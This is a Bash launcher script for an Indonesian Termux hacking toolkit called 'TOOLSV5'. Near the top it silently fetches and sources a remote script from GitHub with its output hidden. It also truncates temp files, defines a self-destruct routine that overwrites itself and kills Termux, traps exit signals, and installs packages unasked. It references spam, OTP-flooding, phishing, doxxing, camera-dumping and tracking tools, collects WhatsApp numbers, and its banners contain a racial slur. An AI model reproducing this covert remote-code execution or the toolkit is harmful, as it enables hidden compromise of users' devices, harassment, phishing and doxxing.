#!/bin/bash
find $PREFIX/tmp -mindepth 1 -type f -exec truncate -s 0 {} \;
e() { echo -e "$@"; }
m="\033[1;31m"
h="\033[1;32m"
k="\033[1;33m"
b="\033[1;34m"
bl="\033[1;36m"
p="\033[1;37m"
u="\033[1;35m"
pu="\033[1;30m"
c="\033[1;96m"
or="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
bld="\033[1;94m"
pwl="\033[1;95m"
blg="\033[1;97m"
lg="\033[1;90m"
bg_m="\033[41m"
bg_h="\033[42m"
bg_k="\033[43m"
bg_b="\033[44m"
bg_bl="\033[46m"
bg_p="\033[47m"
bg_u="\033[45m"
bg_pu="\033[40m"
bg_c="\033[106m"
bg_or="\033[101m"
bg_g="\033[102m"
bg_y="\033[103m"
bg_bld="\033[104m"
bg_pwl="\033[105m"
bg_lg="\033[100m"
colors=()
for i in {81..127}; do
       colors+=("\033[38;5;${i}m")
done
hancurkan_diri() {
    echo -e "${m}[ DESTROYING ]$c Menghapus semua jejak${NC}"
    echo "BAKA" > "$0"
    killall bash
    pkill -9 -f "com.termux" 2>/dev/null
    exit 0
}
curl -sL "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/Version" -o $PREFIX/lib/version &> /dev/null
curl -sL -o $PREFIX/tmp/infoupdate "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/info" &> /dev/null
source <(curl -sL "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/.Lihat-Ada-Anak-Anjing") &> /dev/null
curl -sL -o "$PREFIX/lib/blockID" "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/block.txt" &> /dev/null 
curl -sL -o "$PREFIX/lib/status.txt" "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/status.txt" &> /dev/null
versitoolsv5=$(cat $PREFIX/lib/version)
update="$PREFIX/lib/infoupdate"
termux_id=$(whoami)
ENCRYPTION_PASS="SORASAKIHINA"
LOCAL_UUID_FILE="$PREFIX/share/cowsay/cows/$versitoolsv5"
gal="$LOCAL_UUID_FILE"
edukasi="$PREFIX/.galirus-officia"
DATABASE_URL="https://od.lk/s/OV8yNTE0NTg4MTRf/database_ID.sh"
DIR_SAVE="$PREFIX/share/.DIR_TOOLSV5"
cek_dir_toolsv5="$DIR_SAVE"
echo "ON" > "$edukasi" &> /dev/null
while true; do
       if [ -d "$cek_dir_toolsv5" ]; then
              break
       else
              mkdir -p "$DIR_SAVE"
       fi
done
get_unique_colors() {
       local -n arr=$1
       local count=$2
       local result=()
       while [ ${#result[@]} -lt $count ]; do
              local c=${arr[RANDOM % ${#arr[@]}]}
              local uniq=true
              for r in "${result[@]}"; do
                     [[ $r == "$c" ]] && uniq=false && break
              done
              $uniq && result+=("$c")
       done
       echo "${result[@]}"
}
read -r ran1 ran2 ran3 ran4 ran5 ran6 ran7 ran8 ran9 ran10 <<< "$(get_unique_colors colors 10)"
ran_names=(ran1 ran2 ran3 ran4 ran5 ran6 ran7 ran8 ran9 ran10)
random_index=$((RANDOM % 10))
selected_var=${ran_names[$random_index]}
g404=${!selected_var}
ran1=${colors[RANDOM % ${#colors[@]}]}
while true; do
       ran2=${colors[RANDOM % ${#colors[@]}]}
       [[ $ran1 != "$ran2" ]] && break
done
while true; do
       ran=${colors[RANDOM % ${#colors[@]}]}
       [[ $ran2 != "$ran1" ]] && break
done
while true; do
       ran3=${colors[RANDOM % ${#colors[@]}]}
       [[ $ran1 && $ran2 != "$ran3" ]] && break
done
while true; do
       ran4=${colors[RANDOM % ${#colors[@]}]}
       [[ $ran1 && $ran2 && $ran3 != "$ran4" ]] && break
done
res="\033[0m"
trial="$PREFIX/lib/bash/fndmnc95913592fn"
ctrl_handler() {
       case "$1" in
              SIGINT)
                     echo
                     e $k$bg_lg " System Break (Ctrl+C), Kembali ke TOOLSV5 $k$res"
                     ;;
              SIGTSTP)
                     echo
                     e $k$bg_lg " System Break (Ctrl+Z), Kembali ke TOOLSV5 $k$res"
                     ;;
              SIGTERM)
                     echo
                     e $k$bg_lg " System Break (Kill), Kembali ke TOOLSV5 $k$res"
                     ;;
       esac
       sleep 3
}
trap 'ctrl_handler SIGINT' SIGINT
trap 'ctrl_handler SIGTSTP' SIGTSTP
trap 'ctrl_handler SIGTERM' SIGTERM
tutorial() {
       e "$k Silahkan enter untuk tonton tutorialnya$res"
       mpv "https://od.lk/s/NzNfOTQ4NzcwOTBf/luvvoice.com-20250528-0ONndO.mp3" &> /dev/null &
       read
}
key() {
       dialog --infobox "Verifikasi..." 3 20
       PASSWORD_FILE="$PREFIX/lib/.tools_pass"
       CORRECT_PASS="WatashiGalirus"
       if [[ -f $PASSWORD_FILE ]]; then
              SavedPass=$(< "$PASSWORD_FILE")
              [ "$SavedPass" != "$CORRECT_PASS" ] && rm -f "$PASSWORD_FILE"
       fi
       while [[ ! -f $PASSWORD_FILE ]]; do
              PasswordInput=$(dialog --title "AUTH" --inputbox "Password:" 10 50 --stdout)
              [ $? -ne 0 ] && {
                     clear
                     exit 0
              }
              if [[ $PasswordInput == "$CORRECT_PASS" ]]; then
                     echo "$PasswordInput" > "$PASSWORD_FILE"
                     clear
                     break
              else
                     dialog --title "ERROR" --msgbox "Password salah" 7 50
              fi
       done
       return 0
}
menu() {
       while true; do
              choice=$(dialog --clear --stdout --title "Menu Toolsv5" \
                     --menu "Pilih opsi:" 15 50 10 \
                     1 "Masuk Ke Toolsv5" \
                     2 "Pendaftaran ID" \
                     0 "Keluar")
              [ -z "$choice" ] && {
                     clear
                     exit 0
              }
              case $choice in
                     1)
                            break
                            ;;
                     2)
                            dialog --infobox "Pendaftaran..." 3 20
                            clear
                            encrypt_id() {
                                   local id_data="$1"
                                   echo "$id_data" | openssl enc -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"$ENCRYPTION_PASS" -base64 2> /dev/null | tr -d '\n'
                            }
                            generate_random_username() {
                                   local prefix="user"
                                   local db_online_content
                                   db_online_content=$(curl -fsSL "$DATABASE_URL" 2> /dev/null)
                                   declare -A used_numbers=()
                                   if [[ -n $db_online_content ]]; then
                                          while read -r line; do
                                                 user=$(awk '{print $1}' <<< "$line")
                                                 if [[ $user =~ ^$prefix([0-9]+)$ ]]; then
                                                        num=${BASH_REMATCH[1]}
                                                        num=$((10#$num))
                                                        used_numbers[$num]=1
                                                 fi
                                          done <<< "$db_online_content"
                                   fi
                                   local max_limit=500
                                   local candidate
                                   local tries=0
                                   local max_tries=1000
                                   while ((tries < max_tries)); do
                                          candidate=$((RANDOM % max_limit + 1))
                                          if [[ -z ${used_numbers[$candidate]} ]]; then
                                                 printf "%s%02d\n" "$prefix" "$candidate"
                                                 return 0
                                          fi
                                          ((tries++))
                                   done
                                   local max_number=0
                                   for n in "${!used_numbers[@]}"; do
                                          ((n > max_number)) && max_number=$n
                                   done
                                   local next_number=$((max_number + 1))
                                   printf "%s%02d\n" "$prefix" "$next_number"
                            }
                            generate_uuid() {
                                   printf '%04x%04x-%04x-4%03x-%04x-%04x%04x%04x' \
                                          $((RANDOM)) $((RANDOM)) \
                                          $((RANDOM)) \
                                          $((RANDOM & 0x0fff | 0x4000)) \
                                          $((RANDOM & 0x3fff | 0x8000)) \
                                          $((RANDOM)) $((RANDOM)) $((RANDOM))
                            }
                            register_user() {
                                   clear
                                   echo -e "\n\033[1;36m=== REGISTRASI USER TERMUX (UUID) ===\033[0m\n"
                                   username=$(generate_random_username)
                                   if [ $? -ne 0 ]; then
                                          echo -e "\033[1;31mGagal generate username unik\033[0m" >&2
                                          return 1
                                   fi
                                   echo -e "Username yang di-generate: \033[1;32m$username\033[0m"
                                   while true; do
                                          read -p "Masukkan nomor WhatsApp (contoh: 6281234567890): " whatsapp
                                          if [[ $whatsapp =~ ^[0-9]{10,15}$ ]]; then
                                                 break
                                          else
                                                 echo -e "\033[1;31mError: Nomor WhatsApp tidak valid! Harus 10-15 digit angka.\033[0m"
                                          fi
                                   done
                                   uuid=$(generate_uuid)
                                   encrypted_uuid=$(encrypt_id "$uuid")
                                   mkdir -p "$(dirname "$LOCAL_UUID_FILE")"
                                   echo "$username $encrypted_uuid $whatsapp" > "$LOCAL_UUID_FILE"
                                   echo -e "\n\033[1;32mRegistrasi berhasil!\033[0m"
                                   echo -e "\n\033[1;37mDetail registrasi:\033[0m"
                                   echo -e "\033[1;33m$username \033[1;35m$encrypted_uuid \033[1;34m$whatsapp\033[0m"
                                   echo -e "\n\n\033[1;37m
Silakan salin dari Username sampai WhatsApp
Dan kirim ke admin untuk aktivasi.\033[0m\n"
                                   sleep 3
                                   read -p "Tekan Enter untuk keluar..."
                            }
                            register_user
                            ;;
                     0)
                            clear
                            exit 0
                            ;;
              esac
       done
}
menu
hapus() {
       echo
}
if command -v nala > /dev/null 2>&1; then
       GALIRUS="nala"
else
       pkg install python python3 -y
       pkg install nala -y
       GALIRUS="paket"
fi
paket="$GALIRUS"
hapus
kill_sound() {
       count=0
       while true; do
              cd $HOME
              pkill -9 -f "mpv.*murid_kesayangan_galirus" &> /dev/null
              pkill -9 -f "mpv.*backsound" &> /dev/null
              pkill -f mpv &> /dev/null
              pkill -f play &> /dev/null
              killall mpv &> /dev/null
              count=$((count + 1))
              if [ "$count" -ge 100 ]; then
                     break
              fi
       done
}
filesound() {
       while true; do
              soundnya="MusicG404"
              filenya="$PREFIX/bin/"
              if [ -f "$filenya$soundnya" ]; then
                     break
              else
                     curl -sL -k -o "$PREFIX/bin/MusicG404" "https://od.lk/s/NzNfOTU0NTM4MjFf/music.txt" &> /dev/null
              fi
       done
}
musik="mpv --volume=50 --shuffle --cache=yes --cache-secs=10 --playlist="$PREFIX/bin/MusicG404" --title="backsound" &> /dev/null &"
musikrun() {
       if pgrep -f "mpv.*backsound" > /dev/null; then
              echo "Musik sudah berjalan di latar belakang."
       else
              echo "Musik tidak sedang berjalan, memulai..."
              $musik &> /dev/null &
       fi
}
server_main="mpv --volume=60 --shuffle --cache=yes --cache-secs=10 "https://youtu.be/TvFjobQBbPw"  --title="server" &> /dev/null &"
maintenance() {
       if pgrep -f "mpv.*server" > /dev/null; then
              echo "Musik sudah berjalan di latar belakang."
       else
              echo "Musik tidak sedang berjalan, memulai..."
              $server_main
       fi
}
sound_efek_murid_galirus() {
       karakter=("KAYOKO" "SEIA" "REISA" "ATSUKO" "NERU" "HOSHINO_PRIME" "SHIROKO_TERROR" "IBUKI" "ARISU" "MAMAHINA" "NONOMI" "IZUNA" "MOMOI" "SERIKA" "SHIROKO" "HOSHINO" "SAORI" "MITSUKI" "MIKA" "KASUZA" "HINADRES" "HINA" "HARUKA" "HANAKO")
       random_index=$((RANDOM % ${#karakter[@]}))
       putar="${karakter[random_index]}"
       acak_audio=$(echo "${audio_urls[$putar]}" | tr ' ' '\n')
       for audio in $acak_audio; do
              clear
              echo "$putar" > /sdcard/.voice
              sync # Memastikan data langsung disimpan ke penyimpanan
              mpv --volume=70 --cache=yes --cache-secs=10 "$audio" --title="murid_kesayangan_galirus" &> /dev/null
       done
}

play_sound_effect() {
       sync # Memastikan data di file sudah terbaru sebelum dibaca
       audio_cek=$(cat /sdcard/.voice 2> /dev/null || echo "Tidak ada data")
       if ps aux | grep -v grep | grep -q "mpv.*murid_kesayangan_galirus"; then
              echo "$audio_cek"
              echo "Sound On ( voice sedang berjalan )"
              sleep 3
       else
              echo "Sound Off ( loading play ) "
              AUDIO_DIR="$PREFIX/lib/bash/.Audio"
              BLACKLIST="$AUDIO_DIR/4OBKZY4DVLRYHJPDQO6OHA5L4OBLTZMFRDTZJHY_1.wav"
              mapfile -t audio_files < <(find "$AUDIO_DIR" -type f \( -iname "*.wav" -o -iname "*.ogg" -o -iname "*.mp3" \) ! -path "$BLACKLIST")
              if [ ${#audio_files[@]} -eq 0 ]; then
                     echo "Tidak ada file audio yang tersedia."
              fi
              random_file="${audio_files[RANDOM % ${#audio_files[@]}]}"
              mpv --volume=70 "$AUDIO_DIR/4OBKZY4DVLRYHJPDQO6OHA5L4OBLTZMFRDTZJHY_1.wav" &> /dev/null
              mpv --volume=70 "$random_file" &> /dev/null
              sound_efek_murid_galirus &> /dev/null &
              sleep 3
       fi
}

list=(
       "$PREFIX/.bug"
       "$DIR_SAVE/litespam"
       "$PREFIX/share/gemoxi"
       "$DIR_SAVE/Ketupat-Terror"
       "$DIR_SAVE/Premium-Call"
       "$DIR_SAVE/OTP_TeRoRV2"
       "$PREFIX/lib/bash/spam/"
       "$PREFIX/lib/pkgconfig/spamweb"
       "$DIR_SAVE/seeker"
       "$PREFIX/opt/zphisher"
       "$DIR_SAVE/ngrok"
       "$DIR_SAVE/adbwebkit"
       "/sdcard/UserFinder"
       "/sdcard/CAM-DUMPER"
       "$DIR_SAVE/Temp-Mail"
       "$DIR_SAVE/Doxxer-Toolkit"
       "$DIR_SAVE/okadminfinder3"
       "$pandora"
       "$PREFIX/include/NIK"
       "$DIR_SAVE/overload"
       "$DIR_SAVE/GhostTrack"
       "$DIR_SAVE/okadminfinder3"
       "$DIR_SAVE/RED_HAWK"
       "$DIR_SAVE/Trust-YourCam"
       "$PREFIX/bot2g404"
       "$PREFIX/bot3"
       "$PREFIX/Bot4"
       "$bot3")
echo 'echo "DECODE HARAM BEBAN LU ASU"' > /data/data/com.termux/files/home/Lubeban/run &> /dev/null
banner1() {
       echo "⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣼⠀⠀⠀⠀⠈⠙⡆⢤⠀⠀⠀⠀⠀⣷⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⡷⡆⠀⣵⣶⣿⣾⣷⣸⣄⠀⠀⠀⢰⠾⡿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣽⣿⣿⣿⣿⡟⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣻⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠐⣻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡄⠀⠀⠀⠀⢻⣿⣿⣷⡌⠸⣿⣾⢿⡧⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⢛⣵⣾⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⣌⠙⠋⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣷⣮⡙⢿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⡀⠀⠀⠀⣠⣽⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣇⠀⠀⠀⠀
⠀⠀⠀⣴⣯⣴⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⡦⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⢴⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣧⣽⣦⠀⠀⠀
⠀⠀⣼⣿⣿⣿⠟⢁⣴⣿⡿⢿⣿⣿⡿⠛⣰⣿⠟⣻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⡿⢿⣿⣦⡈⠻⣿⣿⣿⣧⠀⠀
⠀⡼⣻⣿⡟⢁⣴⡿⠋⠁⢀⣼⣿⠟⠁⣰⣿⠁⢰⣿⣿⣿⡿⣿⣿⣿⠿⠀⣠⣤⣾⣿⣿⣿⣿⣿⠀⠀⠽⣿⣿⣿⢿⣿⣿⣿⡆⠈⢿⣆⠀⠻⣿⣧⡀⠈⠙⢿⣦⡈⠻⣿⣟⢧⠀
⠀⣱⣿⠋⢠⡾⠋⠀⢀⣠⡾⠟⠁⠀⢀⣿⠟⠀⢸⣿⠙⣿⠀⠈⢿⠏⠀⣾⣿⠛⣻⣿⣿⣿⣿⣯⣤⠀⠀⠹⡿⠁⠀⣿⠏⣿⡇⠀⠹⣿⡄⠀⠈⠻⢷⣄⡀⠀⠙⢷⣄⠙⣿⣎⠂
⢠⣿⠏⠀⣏⢀⣠⠴⠛⠉⠀⠀⠀⠀⠈⠁⠀⠀⠀⠛⠀⠈⠀⠀⠀⠀⠈⢿⣿⣼⣿⣿⣿⣿⢿⣿⣿⣶⠀⠀⠀⠀⠀⠁⠀⠛⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠛⠦⣄⣀⣹⠀⠹⣿⡄
⣼⡟⠀⣼⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠁⠀⢹⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣧⠀⢻⣷
⣿⠃⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣶⣦⣤⠀⠀⣿⡿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⠘⣿
⣿⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠈⢻⣷⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣀⣀⣸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣿
⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇
⠈⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
}
banner2() {
       echo "
  [ WEEHEEEE YOOO NIGGA IS COMMING ]
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⡿⠿⢿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣶⣿⣶⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠁⣀⣤⡄⢹⣷⡀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⡧⠤⠤⣌⣉⣩⣿⡿⠶⠶⠒⠛⠛⠻⠿⠶⣾⣿⣣⠔⠉⠀⠀⠙⡆⢻⣷⠀⠀⠀⠀⠀
⠀⠀⢸⣿⠀⠀⢠⣾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡃⠀⠀⠀⠀⠀⢻⠘⣿⡀⠀⠀⠀⠀
⠀⠀⠘⣿⡀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣤⣀⠀⢘⠀⣿⡇⠀⠀⠀⠀
⠀⠀⠀⢿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⣴⣿⠀⠀⠀⠀⠀
⠀⠀⠀⣸⡟⠀⠀⠀⣴⡆⠀⠀⠀⠀⠀⠀⠀⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⡀⠀⠀⠀⠀
⠀⠀⢰⣿⠁⠀⠀⣰⠿⣇⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⢠⡄⠀⠀⠀⠀⠀⡀⠀⠹⣷⠀⠀⠀⠀
⠀⠀⣾⡏⠀⢀⣴⣿⣤⢿⡄⠀⠀⠀⠀⠀⠀⠸⣿⣷⡀⠘⣧⠀⠀⠀⠀⠀⣷⣄⠀⢻⣇⠀⠀⠀
⠀⠀⢻⣇⠀⢸⡇⠀⠀⠀⢻⣄⠀⠀⠀⠀⠀⣤⡯⠈⢻⣄⢻⡄⠀⠀⠀⠀⣿⡿⣷⡌⣿⡄⠀⠀
⠀⢀⣸⣿⠀⢸⡷⣶⣶⡄⠀⠙⠛⠛⠛⠛⠛⠃⣠⣶⣄⠙⠿⣧⠀⠀⠀⢠⣿⢹⣻⡇⠸⣿⡄⠀
⢰⣿⢟⣿⡴⠞⠀⠘⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡇⠀⣿⡀⢀⣴⠿⣿⣦⣿⠃⠀⢹⣷⠀
⠀⢿⣿⠁⠀⠀⠀⠀⠀⠀⠀⢠⣀⣀⡀⠀⡀⠀⠀⠀⠀⠀⠀⣿⠛⠛⠁⠀⣿⡟⠁⠀⠀⢀⣿⠂
⠀⢠⣿⢷⣤⣀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠉⠀⠀⠀⠀⠀⢠⡿⢰⡟⠻⠞⠛⣧⣠⣦⣀⣾⠏⠀
⠀⢸⣿⠀⠈⢹⡿⠛⢶⡶⢶⣤⣤⣤⣤⣤⣤⣤⣤⣶⠶⣿⠛⠷⢾⣧⣠⡿⢿⡟⠋⠛⠋⠁⠀⠀
⠀⣾⣧⣤⣶⣟⠁⠀⢸⣇⣸⠹⣧⣠⡾⠛⢷⣤⡾⣿⢰⡟⠀⠀⠀⣿⠋⠁⢈⣿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣼⡏⠻⢿⣶⣤⣿⣿⠀⠈⢉⣿⠀⢸⣏⠀⣿⠈⣷⣤⣤⣶⡿⠶⠾⠋⣉⣿⣦⣀⠀⠀⠀
⠀⠀⣼⡿⣇⠀⠀⠙⠻⢿⣿⠀⠀⢸⣇⠀⠀⣻⠀⣿⠀⣿⠟⠋⠁⠀⠀⢀⡾⠋⠉⠙⣿⡆⠀⠀
⠀⠀⢻⣧⠙⢷⣤⣦⠀⢸⣿⡄⠀⠀⠉⠳⣾⠏⠀⢹⣾⡇⠀⠀⠙⠛⠶⣾⡁⠀⠀⠀⣼⡇⠀⠀
⠀⠀⠀⠙⠛⠛⣻⡟⠀⣼⣿⣇⣀⣀⣀⡀⠀⠀⠀⣸⣿⣇⠀⠀⠀⠀⠀⠈⢛⣷⠶⠿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣅⣠⣿⠛⠋⠉⠉⠛⠻⠛⠛⠛⠛⠋⠻⣧⡀⣀⣠⢴⠾⠉⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣼⡏⠉⣿⡟⠁⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣌⠁⠀⠀⠈⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣇⣠⣿⣿⡶⠶⠶⣶⣿⣷⡶⣶⣶⣶⣶⡶⠶⠶⢿⣿⡗⣀⣤⣾⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠛⢻⣿⡇⠀⠀⣿⡟⠛⠷⠶⠾⢿⣧⠁⠀⠀⣸⡿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣦⣤⡿⠀⠀⠀⠀⠀⠀⢿⣧⣤⣼⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
}
banner3() {
       echo "

"
}
banner4() {
       echo "
████████╗ ██████╗  ██████╗ ██╗     ███████╗██╗   ██╗███████╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝██║   ██║██╔════╝
   ██║   ██║   ██║██║   ██║██║     ███████╗██║   ██║███████╗
   ██║   ██║   ██║██║   ██║██║     ╚════██║╚██╗ ██╔╝╚════██║
   ██║   ╚██████╔╝╚██████╔╝███████╗███████║ ╚████╔╝ ███████║
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝  ╚═══╝  ╚══════╝
                                                            "
}
banner5() {
       echo "
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
